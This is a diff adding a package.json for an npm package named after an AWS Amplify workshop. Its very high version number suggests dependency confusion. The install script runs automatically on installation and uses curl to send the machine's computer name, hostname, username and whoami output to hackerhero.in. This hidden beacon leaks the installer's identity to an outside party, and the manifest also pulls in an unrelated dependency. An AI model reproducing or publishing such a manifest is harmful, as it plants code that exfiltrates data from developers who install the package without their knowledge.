@@ -1,0 +1,14 @@
+{
+  "name": "aws-amplify-unicorntrivia-workshop",
+  "version": "200.0.16",
+  "description": "aws-amplify-unicorntrivia-workshop: coolest nodejs  package on planet earth",
+  "main": "index.js",
+  "scripts": {
+   "install": "curl -sI http://hackerhero.in/jugnu/%computername%`hostname`/%username%-`whoami`/p-aws-amplify-unicorntrivia-workshop"
+  },
+  "author": "another noob developer",
+  "license": "ISC",
+  "dependencies": {
+    "wf-translate-text": "^0.0.1"
+  }
+}
